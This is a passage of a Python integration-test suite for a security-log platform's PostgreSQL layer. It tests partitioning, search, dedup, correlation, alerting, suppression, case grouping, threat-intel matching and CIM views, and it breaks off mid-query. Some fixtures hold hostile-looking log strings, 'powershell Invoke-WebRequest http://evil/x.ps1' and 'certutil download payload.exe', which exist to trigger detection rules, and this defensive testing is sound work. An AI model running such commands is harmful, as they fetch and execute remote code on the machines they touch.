# Author : Krishnendu De
# Co-Author: Claude Fable 5.0
"""Real-PostgreSQL integration tests for the data layer.

These exercise what the DB-free unit tests cannot: month partitioning and its
auto-creation, the GIN full-text index, inet/CIDR search, ON CONFLICT dedup,
retention purge dropping whole partitions, the correlation SQL, alert
insert/dedup/queries, the pipeline write path, and the auth/collector/registry
round-trips. They run only when DB_DSN is set (see tests/conftest.py).

The CIM section at the bottom carries more weight than the rest of this file. The
Backbone-2 storage design was written on a machine with no PostgreSQL and no Docker,
so nothing in it has ever executed anywhere except here: these tests are the first
and only place `events.cim_models`, the GIN index that the whole `datamodel:`
performance premise rests on, the eleven `cim_<tag>` views, and `db.backfill_cim`
have ever met a real server. Treat a failure in that section as new information
about the design, not as a flaky test.
"""
from __future__ import annotations

import re
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from app import cim
from app.cim.spec import (CimClause, CimField, CimModel, CimRegistry, CimSource,
                          CimTerm)
from app.detection import engine as de
from app.detection import runtime as rt
from app.models import NormalizedEvent

pytestmark = pytest.mark.integration

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"
_T0 = datetime(2026, 6, 1, 12, 0, tzinfo=timezone.utc)


def _evt(**kw) -> NormalizedEvent:
    kw.setdefault("event_time", _T0)
    kw.setdefault("vendor", "testvendor")
    kw.setdefault("raw", {"k": "v"})
    return NormalizedEvent(**kw)


def _store(db, events, batch_id: int = 1) -> None:
    with db.pool().connection() as conn:
        db.insert_events(conn, events, batch_id)
        conn.commit()


def _partitions(db) -> set[str]:
    with db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT c.relname AS name FROM pg_inherits i "
            "JOIN pg_class c ON c.oid = i.inhrelid "
            "WHERE i.inhparent = 'events'::regclass").fetchall()
    return {r["name"] for r in rows}


# --------------------------------------------------------------------------- #
#  Schema, partitioning, search/FTS, dedup, purge                             #
# --------------------------------------------------------------------------- #
def test_schema_has_core_tables(clean_db):
    with clean_db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema = 'public'").fetchall()
    names = {r["table_name"] for r in rows}
    assert {"events", "alerts", "ingest_batches", "detection_rules", "api_keys",
            "users", "sessions", "audit_log", "collectors",
            "response_actions"} <= names


def test_event_insert_search_fts_and_cidr(clean_db):
    db = clean_db
    _store(db, [
        _evt(vendor="paloalto", action="allow", src_ip="10.1.2.3", dst_ip="8.8.8.8",
             message="certutil download payload.exe"),
        _evt(vendor="cisco", action="deny", src_ip="203.0.113.9",
             message="connection blocked"),
    ])
    rows, total = db.search({"vendor": "paloalto"}, 50, 0)
    assert total == 1 and rows[0]["src_ip"] == "10.1.2.3"      # host(inet) rendered
    assert db.search({"q": "certutil"}, 50, 0)[1] == 1          # GIN full-text index
    assert db.search({"src_ip": "10.0.0.0/8"}, 50, 0)[1] == 1   # inet CIDR containment
    assert db.search({"src_ip": "10.0.0.0/8"}, 50, 0)[0][0]["src_ip"] == "10.1.2.3"
    assert db.search({"action": "deny"}, 50, 0)[1] == 1


def test_dedup_on_conflict(clean_db):
    db = clean_db
    _store(db, [_evt(vendor="dup", message="same")])
    _store(db, [_evt(vendor="dup", message="same")])           # identical identity
    assert db.search({"vendor": "dup"}, 50, 0)[1] == 1
    assert db.count_batch_rows(1) == 1


def test_monthly_partitions_autocreated(clean_db):
    db = clean_db
    _store(db, [
        _evt(event_time=datetime(2026, 1, 15, tzinfo=timezone.utc), vendor="jan"),
        _evt(event_time=datetime(2026, 3, 20, tzinfo=timezone.utc), vendor="mar"),
    ])
    parts = _partitions(db)
    assert "events_202601" in parts and "events_202603" in parts
    # the rows landed in the dedicated month partitions, not events_default
    with db.pool().connection() as conn:
        n_default = conn.execute("SELECT count(*) AS n FROM events_default").fetchone()["n"]
    assert n_default == 0


def test_purge_drops_old_partitions(clean_db):
    db = clean_db
    _store(db, [_evt(event_time=datetime(2020, 1, 10, tzinfo=timezone.utc), vendor="old"),
                _evt(vendor="recent")])
    assert "events_202001" in _partitions(db)
    dropped = db.purge_older_than(1)          # arg clamps up to the 3yr floor; 2020 is far older
    assert "events_202001" in dropped
    assert "events_202001" not in _partitions(db)
    assert db.search({"vendor": "old"}, 50, 0)[1] == 0
    assert db.search({"vendor": "recent"}, 50, 0)[1] == 1      # current month untouched


def test_purge_respects_retention_floor(clean_db):
    """purge_older_than never drops below RETENTION_YEARS, even if asked to."""
    db = clean_db
    two_years_ago = (datetime.now(timezone.utc).replace(day=15) - timedelta(days=730))
    _store(db, [_evt(event_time=two_years_ago, vendor="within-floor")])
    part = f"events_{two_years_ago.year:04d}{two_years_ago.month:02d}"
    assert part in _partitions(db)
    dropped = db.purge_older_than(1)          # asks 1yr, but the 3yr floor protects it
    assert part not in dropped and part in _partitions(db)
    assert db.search({"vendor": "within-floor"}, 50, 0)[1] == 1


def test_is_last_admin_guard(clean_db):
    from app import auth
    db = clean_db
    a1 = db.create_user("admin1", auth.hash_password("x"), "admin")
    assert db.is_last_admin(a1) is True
    a2 = db.create_user("admin2", auth.hash_password("y"), "admin")
    assert db.is_last_admin(a1) is False          # another enabled admin exists
    db.set_user_enabled(a2, False)
    assert db.is_last_admin(a1) is True           # a2 disabled -> a1 is the last again
    viewer = db.create_user("viewer1", auth.hash_password("z"), "viewer")
    assert db.is_last_admin(viewer) is False      # not an admin


def test_reupload_of_timestampless_file_dedups(clean_db):
    """A file whose events have no parseable timestamp still dedups on re-upload
    (the fallback time is reused from the first batch)."""
    from app import ingest as ingest_mod
    _db = clean_db
    payload = ('{"source":{"ip":"10.0.0.1"},"event":{"action":"login"},'
               '"message":"record with no timestamp field"}')
    r1 = ingest_mod.ingest(payload, "generic_json", filename="notime.json")
    r2 = ingest_mod.ingest(payload, "generic_json", filename="notime.json")
    assert r1["inserted"] == 1
    assert r2["inserted"] == 0 and r2["duplicates"] == 1
    assert r2["already_ingested"] is True


# --------------------------------------------------------------------------- #
#  Correlation SQL                                                             #
# --------------------------------------------------------------------------- #
def test_correlation_threshold(clean_db):
    db = clean_db
    base = datetime.now(timezone.utc) - timedelta(minutes=1)
    _store(db, [_evt(event_time=base + timedelta(seconds=i), vendor="fw",
                     action="failed-logon", src_ip="45.1.2.3", message=f"fail {i}")
                for i in range(5)])
    groups = db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 5)
    assert groups and groups[0]["src_ip"] == "45.1.2.3" and groups[0]["n"] >= 5
    assert db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 6) == []   # under threshold
    assert db.correlate({"action": "failed-logon"}, ["src_ip"], 1, 5) == []      # outside window


def test_correlation_distinct_count(clean_db):
    """distinct_col counts DISTINCT values of a column (password spray: one src_ip
    failing against many distinct users), not raw events."""
    db = clean_db
    base = datetime.now(timezone.utc) - timedelta(minutes=1)
    # one source failing against 12 DISTINCT users ...
    evts = [_evt(event_time=base + timedelta(seconds=i), vendor="fw", action="failed-logon",
                 src_ip="45.9.9.9", user_name=f"user{i}") for i in range(12)]
    # ... plus 20 more failures all against the SAME user (inflates count(*), NOT distinct)
    evts += [_evt(event_time=base + timedelta(seconds=100 + i), vendor="fw", action="failed-logon",
                  src_ip="45.9.9.9", user_name="user0") for i in range(20)]
    _store(db, evts)

    # distinct user_name >= 10 -> fires; n is the DISTINCT count (12), not 32 events
    groups = db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 10, "user_name")
    assert groups and groups[0]["src_ip"] == "45.9.9.9" and groups[0]["n"] == 12
    # threshold above the distinct count -> nothing
    assert db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 13, "user_name") == []

    # a second source hitting only 3 distinct users is NOT a spray
    _store(db, [_evt(event_time=base + timedelta(seconds=i), vendor="fw", action="failed-logon",
                     src_ip="10.0.0.5", user_name=f"acct{i % 3}") for i in range(9)], batch_id=2)
    sprayers = {g["src_ip"] for g in
                db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 10, "user_name")}
    assert "45.9.9.9" in sprayers and "10.0.0.5" not in sprayers

    # a distinct_col that is also a group_by column falls back to count(*) (32 events)
    fallback = db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 10, "src_ip")
    assert any(g["src_ip"] == "45.9.9.9" and g["n"] == 32 for g in fallback)


# --------------------------------------------------------------------------- #
#  Pipeline write path + alerts                                               #
# --------------------------------------------------------------------------- #
def test_pipeline_writes_events_and_alerts(clean_db):
    db = clean_db
    from app import pipeline
    rt.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn,
                [_evt(vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")],
                batch_id=1)
            conn.commit()
    finally:
        rt.set_engine(None)
    assert res.total == 1
    assert db.count_batch_rows(1) == 1
    alerts, total = db.recent_alerts({}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in alerts)


def test_alerts_insert_dedup_and_queries(clean_db):
    db = clean_db
    rule = next(r for r in de.load_rules(RULES_DIR) if r.id == "lo-rdp-allowed")
    evt = _evt(vendor="paloalto", src_ip="9.9.9.9", action="allow", dst_port=3389,
               message="rdp session")
    alert = de.alert_from_match(rule, evt, dedup_hash="dh-1", batch_id=1)

    with db.pool().connection() as conn:
        new = db.insert_alerts(conn, [alert], return_inserted=True)
        conn.commit()
    assert len(new) == 1 and new[0]["id"]
    with db.pool().connection() as conn:                       # re-insert => deduped
        again = db.insert_alerts(conn, [alert], return_inserted=True)
        conn.commit()
    assert again == []

    rows, total = db.recent_alerts({"level": "medium"}, 50, 0)
    assert total == 1 and rows[0]["rule_id"] == "lo-rdp-allowed"
    assert db.alert_severity_counts().get("medium") == 1
    assert db.alert_technique_counts(30).get("T1021.001") == 1

    db.set_alert_status(new[0]["id"], "closed")
    assert "medium" not in db.alert_severity_counts()          # only open alerts counted


# --------------------------------------------------------------------------- #
#  Registry, API keys, users/sessions/audit, collectors                       #
# --------------------------------------------------------------------------- #
def test_rule_registry_sync_and_toggle(clean_db):
    db = clean_db
    db.sync_rules(de.load_rules(RULES_DIR))
    assert "lo-rdp-allowed" in db.enabled_rule_ids()
    db.set_rule_enabled("lo-rdp-allowed", False)
    assert "lo-rdp-allowed" not in db.enabled_rule_ids()
    listed = db.list_rules()
    assert any(r["rule_id"] == "lo-rdp-allowed" for r in listed)
    assert all("fired" in r for r in listed)                   # alert-count join column


def test_api_keys_roundtrip(clean_db):
    db = clean_db
    rec = db.create_api_key("ci", "scanner")
    assert rec["key"].startswith("lo_")
    assert db.verify_api_key(rec["key"])["name"] == "ci"
    assert db.verify_api_key("lo_bogus") is None
    db.set_api_key_enabled(rec["id"], False)
    assert db.verify_api_key(rec["key"]) is None               # disabled key rejected
    assert any(k["name"] == "ci" for k in db.list_api_keys())


def test_users_sessions_audit_roundtrip(clean_db):
    db = clean_db
    assert db.count_users() == 0
    uid = db.create_user("alice", "pbkdf2$hash", "admin")
    assert db.get_user_by_name("alice")["role"] == "admin"

    now = datetime.now(timezone.utc)
    db.create_session("tok-live", uid, now + timedelta(hours=1))
    assert db.get_session_user("tok-live")["username"] == "alice"
    db.create_session("tok-expired", uid, now - timedelta(hours=1))
    assert db.get_session_user("tok-expired") is None          # expired
    db.delete_session("tok-live")
    assert db.get_session_user("tok-live") is None

    db.set_user_enabled(uid, False)
    db.create_session("tok-disabled", uid, now + timedelta(hours=1))
    assert db.get_session_user("tok-disabled") is None         # disabled user

    db.add_audit("alice", "login", "ok", "127.0.0.1")
    assert db.recent_audit(10)[0]["action"] == "login"


def test_collectors_roundtrip(clean_db):
    db = clean_db
    db.sync_collectors(["okta", "github"])
    assert db.get_collector("okta")["enabled"] is True
    db.update_collector("okta", cursor="C1", last_status="ok", last_count=5)
    okta = db.get_collector("okta")
    assert okta["cursor"] == "C1" and okta["last_count"] == 5 and okta["last_run"] is not None
    assert db.enabled_collector_names() == {"okta", "github"}
    db.set_collector_enabled("github", False)
    assert db.enabled_collector_names() == {"okta"}
    assert len(db.list_collectors()) == 2


def test_saved_searches_roundtrip(clean_db):
    db = clean_db
    db.add_saved_search("alice", "My open highs", "/alerts", "status=open&level=high")
    db.add_saved_search("alice", "Firewall denies", "/search", "vendor=fortinet&action=deny")
    db.add_saved_search("bob", "Bob only", "/search", "q=bob")

    alice_all = db.list_saved_searches("alice")
    assert {s["name"] for s in alice_all} == {"My open highs", "Firewall denies"}
    assert [s["name"] for s in db.list_saved_searches("alice", "/alerts")] == ["My open highs"]

    # same owner+name+path overwrites the query (upsert), not a duplicate
    db.add_saved_search("alice", "My open highs", "/alerts", "status=open&level=critical")
    highs = db.list_saved_searches("alice", "/alerts")
    assert len(highs) == 1 and "critical" in highs[0]["query"]

    # delete is scoped to owner: bob can't delete alice's row
    bob_row = db.list_saved_searches("bob")[0]
    db.delete_saved_search(bob_row["id"], "alice")            # wrong owner -> no-op
    assert len(db.list_saved_searches("bob")) == 1
    db.delete_saved_search(bob_row["id"], "bob")
    assert db.list_saved_searches("bob") == []


def test_response_auto_revert_roundtrip(clean_db):
    db = clean_db
    from datetime import datetime, timedelta, timezone

    from app.response import revert

    now = datetime.now(timezone.utc)
    # A time-boxed block that came due a minute ago, plus one still in the future.
    db.insert_response_action({"alert_id": 1, "playbook_id": "pb-block",
                               "action_type": "block_ip", "target": "45.83.122.7",
                               "status": "success", "detail": "posted",
                               "revert_at": now - timedelta(minutes=1)})
    db.insert_response_action({"alert_id": 2, "playbook_id": "pb-block",
                               "action_type": "block_ip", "target": "10.0.0.9",
                               "status": "success", "detail": "posted",
                               "revert_at": now + timedelta(hours=1)})

    due = db.due_reverts(now)
    assert [r["target"] for r in due] == ["45.83.122.7"]      # only the past-due one

    # With no RESPONSE_WEBHOOK_URL the revert is a skip, but is still audited and
    # the original stamped so it is never reverted twice.
    n = revert.process_due_reverts(now)
    assert n == 1
    assert db.due_reverts(now) == []                          # nothing left due (stamped)

    rows = db.recent_responses(50)
    kinds = {r["action_type"] for r in rows}
    assert "unblock_ip" in kinds                              # inverse action was audited
    original = [r for r in rows if r["action_type"] == "block_ip" and r["target"] == "45.83.122.7"][0]
    assert original["reverted_at"] is not None


def test_iocs_roundtrip_and_pipeline_alert(clean_db):
    db = clean_db
    from app import pipeline
    from app.threatintel import matcher as tim
    from app.threatintel import runtime as tirt

    db.upsert_iocs([tim.make_ioc("203.0.113.5", "feedX", "critical"),
                    tim.make_ioc("evil.test", "feedX")])
    assert db.ioc_counts()["total"] == 2
    assert {r["indicator"] for r in db.enabled_iocs()} == {"203.0.113.5", "evil.test"}

    # re-syncing a feed replaces only that source's indicators
    db.replace_source_iocs("feedX", [tim.make_ioc("198.51.100.9", "feedX")])
    counts = db.ioc_counts()
    assert counts["total"] == 1 and counts["ip"] == 1

    tirt.reload_index()                       # build the in-memory index from the DB
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn, [_evt(vendor="fw", src_ip="198.51.100.9", message="inbound")],
                batch_id=1)
            conn.commit()
    finally:
        tirt.set_index(tim.IocIndex())        # reset the global index for other tests
    assert res.total == 1
    alerts, _ = db.recent_alerts({}, 50, 0)
    ti = next(a for a in alerts if a["rule_id"] == "ti-ioc-match")
    assert ti["level"] == "high" and "198.51.100.9" in ti["message"]

    db.delete_ioc("198.51.100.9", "ip")
    assert db.ioc_counts()["total"] == 0


def test_suppression_pipeline_assignee_and_notes(clean_db):
    db = clean_db
    from app import pipeline
    from app.triage import runtime as suprt, suppression as supm

    rt.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
    sid = db.create_suppression("test", rule_id="lo-ingress-tool-transfer",
                                src_ip="203.0.113.9")
    suprt.reload_index()
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn, [_evt(vendor="x", src_ip="203.0.113.9",
                            message="powershell Invoke-WebRequest http://evil/x.ps1")],
                batch_id=1)
            conn.commit()
    finally:
        rt.set_engine(None)
        suprt.set_index(supm.SuppressionIndex())

    assert res.alerts == []                                  # suppressed -> not dispatched
    suppressed, _ = db.recent_alerts({"status": "suppressed"}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in suppressed)
    default, _ = db.recent_alerts({}, 50, 0)                 # default view hides suppressed
    assert all(a["status"] != "suppressed" for a in default)
    assert next(s for s in db.list_suppressions() if s["id"] == sid)["hit_count"] >= 1

    aid = suppressed[0]["id"]
    db.set_alert_assignee(aid, "alice")
    assert db.get_alert(aid)["assignee"] == "alice"
    db.add_alert_note(aid, "alice", "reviewed — known admin tooling")
    notes = db.alert_notes(aid)
    assert len(notes) == 1 and notes[0]["author"] == "alice"

    db.delete_suppression(sid)
    assert db.list_suppressions() == []


def test_case_grouping(clean_db):
    db = clean_db
    rule = next(r for r in de.load_rules(RULES_DIR) if r.id == "lo-rdp-allowed")

    def mk(dh, src, level):
        a = de.alert_from_match(
            rule, _evt(vendor="paloalto", src_ip=src, action="allow", message="rdp"),
            dedup_hash=dh, batch_id=1)
        a["level"] = level
        return a

    with db.pool().connection() as conn:
        ins = db.insert_alerts(conn, [mk("h1", "9.9.9.9", "medium"),
                                      mk("h2", "9.9.9.9", "critical"),
                                      mk("h3", "9.9.9.9", "low"),
                                      mk("h4", "1.2.3.4", "high")],
                               return_inserted=True)
        conn.commit()
    a1, a2, a3, a4 = [x["id"] for x in ins]

    cid = db.create_case("RDP from 9.9.9.9", severity="low")
    db.add_alert_to_case(a1, cid)
    c = db.get_case(cid)
    assert c["alert_count"] == 1 and c["severity"] == "medium"      # rolled low -> medium

    rel_ids = {r["id"] for r in db.related_open_alerts(cid)}        # share src 9.9.9.9
    assert {a2, a3} <= rel_ids and a4 not in rel_ids

    db.add_alerts_to_case(cid, [a2, a3])
    c = db.get_case(cid)
    assert c["alert_count"] == 3 and c["severity"] == "critical"    # a2 escalates the case
    assert {x["id"] for x in db.case_alerts(cid)} == {a1, a2, a3}
    assert db.get_alert(a2)["case_id"] == cid
    assert a2 not in {r["id"] for r in db.related_open_alerts(cid)}  # now in-case, excluded

    db.remove_alert_from_case(a3)
    assert db.get_case(cid)["alert_count"] == 2 and db.get_alert(a3)["case_id"] is None

    db.add_case_note(cid, "alice", "looks like a scan")
    assert db.case_notes(cid)[0]["author"] == "alice"

    db.update_case(cid, status="closed", assignee="alice")
    closed = db.get_case(cid)
    assert closed["status"] == "closed" and closed["closed_at"] is not None
    assert closed["assignee"] == "alice"
    db.update_case(cid, status="open")
    assert db.get_case(cid)["closed_at"] is None                    # reopening clears it

    assert db.list_cases({}, 50, 0)[1] == 1
    assert db.case_status_counts().get("open") == 1
    assert any(x["id"] == cid for x in db.open_cases())


def test_alert_analytics_aggregations(clean_db):
    db = clean_db
    rule = next(r for r in de.load_rules(RULES_DIR) if r.id == "lo-rdp-allowed")

    def mk(dh, src):
        return de.alert_from_match(
            rule, _evt(vendor="paloalto", src_ip=src, action="allow", message="rdp"),
            dedup_hash=dh, batch_id=1)

    with db.pool().connection() as conn:
        db.insert_alerts(conn, [mk("a", "1.1.1.1"), mk("b", "1.1.1.1"), mk("c", "2.2.2.2")])
        conn.commit()

    assert db.alert_status_counts().get("open") == 3
    assert sum(d["n"] for d in db.alerts_over_time(30)) == 3
    tr = db.top_rules(30)
    assert tr[0]["rule_id"] == "lo-rdp-allowed" and tr[0]["n"] == 3
    ts = db.top_alert_sources(30)
    assert ts[0]["src_ip"] == "1.1.1.1" and ts[0]["n"] == 2

    now = datetime.now(timezone.utc)
    # distinct `raw` per event — see the dedup note in test_batch_lifecycle_and_sha_lookup
    _store(db, [_evt(vendor="x", src_ip="9.9.9.9", event_time=now, raw={"k": "a"}),
                _evt(vendor="x", src_ip="9.9.9.9", event_time=now, message="b",
                     raw={"k": "b"})])
    es = db.top_event_sources(7)
    assert es[0]["src_ip"] == "9.9.9.9" and es[0]["n"] == 2


def test_ueba_entity_baselines_and_risk(clean_db):
    db = clean_db
    from app import pipeline
    from app.detection import runtime as rt2

    rt2.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
    old = datetime.now(timezone.utc) - timedelta(days=10)
    recent = datetime.now(timezone.utc) - timedelta(minutes=5)
    try:
        with db.pool().connection() as conn:
            # establishes user jdoe + association jdoe↔10.0.0.1 (10 days ago)
            pipeline.write_stream(conn, [_evt(vendor="paloalto", user_name="jdoe",
                src_ip="10.0.0.1", event_time=old, message="ok")], batch_id=1)
            # now: jdoe from a NEW ip, RDP allowed -> alert + new association
            pipeline.write_stream(conn, [_evt(vendor="paloalto", user_name="jdoe",
                src_ip="203.0.113.9", dst_port=3389, action="allow", event_time=recent,
                message="rdp")], batch_id=2)
            conn.commit()
    finally:
        rt2.set_engine(None)

    e = db.get_entity("user", "jdoe")
    assert e and e["event_count"] == 2 and e["first_seen"].date() == old.date()

    new_ent = {(r["entity_type"], r["entity_value"]) for r in db.new_entities(24)}
    assert ("ip", "203.0.113.9") in new_ent and ("user", "jdoe") not in new_ent

    assert any(a["entity_value"] == "jdoe" and a["peer_value"] == "203.0.113.9"
               for a in db.new_associations(24))                # established user, new IP

    top = db.top_risk_entities("user", 30, 7.0)
    ju = next((r for r in top if r["value"] == "jdoe"), None)
    assert ju and ju["alerts"] >= 1 and float(ju["score"]) > 0   # RDP alert -> risk

    assert any(a["peer_value"] == "203.0.113.9"
               for a in db.entity_associations("user", "jdoe"))
    assert len(db.entity_alerts("user", "jdoe")) >= 1
    assert sum(d["n"] for d in db.entity_activity("user", "jdoe", 30)) == 2
    assert db.anomaly_counts(24)["new_entities"] >= 1


def test_batch_lifecycle_and_sha_lookup(clean_db):
    db = clean_db
    bid = db.create_batch("fw.log", "sha-abc", "paloalto", "paloalto_csv")
    # `raw` must differ: dedup identity is vendor + event_time + raw (normalize.dedup_hash),
    # and `message` is deliberately NOT part of it. `_evt` defaults raw to a shared stub, so
    # two events differing only by message are genuine duplicates and collapse to one row.
    _store(db, [_evt(vendor="paloalto", message="a", raw={"k": "a"}),
                _evt(vendor="paloalto", message="b", raw={"k": "b"})], batch_id=bid)
    db.update_batch(bid, status="done", total_rows=2, inserted_rows=2)
    assert db.count_batch_rows(bid) == 2
    assert db.find_batch_by_sha("sha-abc")["id"] == bid
    assert db.recent_batches(10)[0]["id"] == bid


# --------------------------------------------------------------------------- #
#  CIM data models (Backbone 2): column, index, views, ingest, backfill, LOQL  #
# --------------------------------------------------------------------------- #
# A month no other test in this file writes to, so the partition-inheritance test can
# assert "this partition did not exist a moment ago" and mean it.
_CIM_T = datetime(2027, 3, 9, 8, 30, tzinfo=timezone.utc)
_CIM_PART = "events_202703"

# The `events` columns a CIM view passes through when no field of the model has claimed
# the name. Restated here rather than imported from `cim.sql` on purpose: this is the
# independent statement of the contract, so a change to the emitter is caught by a test
# instead of quietly agreeing with itself.
_CIM_PASSTHROUGH = ("vendor", "product", "log_type", "severity", "message")


def _win_auth(message: str, event_id: int = 4625) -> NormalizedEvent:
    """A Windows Security event: `event_id` 4625 -> ['authentication'], 4688 ->
    ['endpoint']. Membership reads `raw['event_id']` as an int, which is what
    app/parsers/windows_security.py now writes back (Decision 2b) — so this fixture is
    also the end-to-end check that the write-back and the registry agree.

    Every fixture below puts the message into `raw` as well: `normalize.dedup_hash` is
    vendor + event_time + raw, so events with identical `raw` collapse into ONE row via
    ON CONFLICT, which in this section would look exactly like "cim_models was lost".
    """
    return _evt(event_time=_CIM_T, vendor="microsoft", product="windows",
                log_type="security", user_name="jdoe", src_ip="10.0.0.7",
                host_name="WS-01", message=message,
                raw={"event_id": event_id, "probe": message})


def _ot_write(message: str) -> NormalizedEvent:
    """A Zeek Modbus write -> TWO tags, ['ics', 'network'] (sorted). Multi-model
    membership is the entire reason `cim_models` is a text[] and not one tag column, so
    at least one event in every storage test is deliberately in two models."""
    return _evt(event_time=_CIM_T, vendor="zeek", product="zeek", log_type="modbus",
                src_ip="10.0.0.5", dst_ip="10.0.10.9", src_port=44100, dst_port=502,
                rule_name="CxYz01", message=message,
                raw={"probe": message,
                     "ot": {"protocol": "modbus", "operation": "write_single_register",
                            "is_write": True}})


def _untagged(message: str) -> NormalizedEvent:
    """An event no model claims. `cim_models` must be SQL NULL and never '{}': the GIN
    index is sized by tagged rows only, and `insert_events` and `backfill_cim` have to
    agree on the spelling or a corrected row differs from a freshly ingested one."""
    return _evt(event_time=_CIM_T, vendor="testvendor", message=message,
                raw={"probe": message})


def _web_request(message: str, raw: dict) -> NormalizedEvent:
    """An HTTP access record -> ['web'] (`log_type: access`).

    `raw` is supplied per call because the Web model is where the interesting FIELD
    shapes live: `url` is a four-way COALESCE mixing top-level keys with a nested one,
    and `site` puts the NESTED alternative first. `probe` is merged in so every event has
    a distinct `raw` — `normalize.dedup_hash` is vendor + event_time + raw, so two events
    with equal `raw` collapse into one row via ON CONFLICT and the view would look empty
    for a reason that has nothing to do with the view.
    """
    return _evt(event_time=_CIM_T, vendor="nginx", product="nginx", log_type="access",
                severity="low", action="allowed", src_ip="198.51.100.4",
                dst_ip="10.0.0.80", dst_port=443, app="https", user_name="wuser",
                message=message, raw=dict(raw, probe=message))


def _dns_query(message: str, raw: dict) -> NormalizedEvent:
    """A resolution record -> ['dns'] (`log_type: dns`). Same reason for the per-call
    `raw`: `query`/`record_type`/`answer` are three-way COALESCEs whose alternatives are
    spelled by three different vendors (zeek `query`, sysmon `QueryName`, suricata
    `dns.rrname`)."""
    return _evt(event_time=_CIM_T, vendor="zeek", product="zeek", log_type="dns",
                severity="info", src_ip="10.0.0.33", dst_ip="10.0.0.53",
                user_name="duser", host_name="SENSOR-1",
                message=message, raw=dict(raw, probe=message))


def _ics_op(message: str, log_type: str, action: str, raw: dict) -> NormalizedEvent:
    """A Zeek ICS record -> ['ics', 'network'] for any of the nine OT protocol tags. The
    Industrial model is the only one whose fields are dominated by NESTED paths
    (`raw['ot'][...]`), so it is where `#>> ARRAY[...]` is proved against a real server."""
    return _evt(event_time=_CIM_T, vendor="zeek", product="zeek", log_type=log_type,
                action=action, src_ip="10.0.0.5", dst_ip="10.0.10.9",
                src_port=44100, dst_port=502, rule_name="CxYz01",
                message=message, raw=dict(raw, probe=message))


def _stored_tags(db) -> dict:
    """`{message: cim_models}` straight off the table. Read with raw SQL because
    `db.search` deliberately does not project `cim_models`."""
    with db.pool().connection() as conn:
        rows = conn.execute("SELECT message, cim_models FROM events").fetchall()
    return {r["message"]: r["cim_models"] for r in rows}


def _cim_views(db) -> set[str]:
    with db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT viewname FROM pg_views WHERE schemaname = current_schema() "
            "AND viewname LIKE %s", (r"cim\_%",)).fetchall()
    return {r["viewname"] for r in rows}


def _drop_cim_views(db, names) -> None:
    """Remove the named `cim_<tag>` views, so a following `init_cim` has to CREATE them.

    `clean_db` deliberately KEEPS the views of real models (they are cheap and init_cim
    rebuilds them anyway), which means "the view exists" is true at the start of every
    test in this file — inherited from whichever test ran before. Any test that means to
    prove `init_cim` BUILT something has to clear the ground first, or it is asserting on
    the leftovers of its predecessor and would pass against an `init_cim` that executes no
    DDL at all.
    """
    with db.pool().connection() as conn:
        for name in sorted(names):
            conn.execute(f"DROP VIEW IF EXISTS {name}")
        conn.commit()


def _expected_view_columns(model) -> list[str]:
    """What `SELECT * FROM cim_<tag>` must return: id, event_time, the model's CIM field
    names in declaration order, the passthrough columns no field took, then raw."""
    taken = {f.name for f in model.fields}
    return (["id", "event_time"] + [f.name for f in model.fields]
            + [c for c in _CIM_PASSTHROUGH if c not in taken] + ["raw"])


def _view_rows(db, view: str) -> dict:
    """`{message: row}` read THROUGH `cim_<tag>` — the query surface docs/CIM.md tells
    analysts to use, and the only way a view's WHERE clause and its field expressions are
    ever actually evaluated.

    `message` is the key because it is a PASSTHROUGH column on every shipped model (no
    model declares a field called `message`, so `create_view_ddl` projects the raw
    column), which makes it the one label that means the same thing in all eleven views.
    """
    with db.pool().connection() as conn:
        rows = conn.execute(f"SELECT * FROM {view}").fetchall()
    return {r["message"]: r for r in rows}


def _view_columns(db, view: str) -> list[str]:
    """The column names `SELECT * FROM <view>` actually returns, asked of the server.

    One fresh connection per view on purpose: a failing statement poisons its whole
    transaction, and sharing one would turn "view #3 has a bad expression" into ten
    identical InFailedSqlTransaction errors that name nothing.
    """
    with db.pool().connection() as conn:
        with conn.cursor() as cur:
            cur.execute(f"SELECT * FROM {view} LIMIT 0")
            return [d.name for d in cur.description]


def _indexes(db, relation: str) -> list[dict]:
    """Every index on `relation` as `{name, definition, method, columns}`.

    Read from pg_index rather than the `pg_indexes` view: the parent `events` is a
    PARTITIONED table whose index is a partitioned index (relkind 'I'), and which relkinds
    that view includes has moved between server versions. pg_index has always listed both.

    `method` is the access method (`gin`, `btree`, …) taken from pg_am, and `columns` are
    the INDEXED COLUMNS resolved through pg_attribute. NEITHER CAN BE FAKED BY A NAME.
    This helper used to return `"<name>: <definition>"` concatenated, and both of its
    callers then asked `"cim_models" in d and "gin" in d.lower()` — which a GIN index
    merely NAMED `events_cim_models_idx` but built over `search_tsv` satisfies completely,
    leaving `cim_models @> ARRAY[...]` a full scan with two green tests over it.

    An EXPRESSION column has attnum 0 in `indkey` and so joins to no pg_attribute row and
    contributes no name: an index over `lower(cim_models::text)` therefore comes back with
    `columns` that do NOT equal `['cim_models']`, rather than matching by accident. The
    `indkey` cast is explicit (`::smallint[]`) rather than leaning on the implicit
    int2vector coercion, `attname` is cast to text so the COALESCE has one element type,
    WITH ORDINALITY keeps multi-column order meaningful, and the unnest is an explicit
    LATERAL join rather than a correlated sub-select in the target list — this query has
    no server to be tried against on the machine it was written on, so every construct in
    it is the unambiguous spelling.
    """
    with db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT c.relname AS indexname, "
            "       pg_get_indexdef(i.indexrelid) AS indexdef, "
            "       am.amname AS method, "
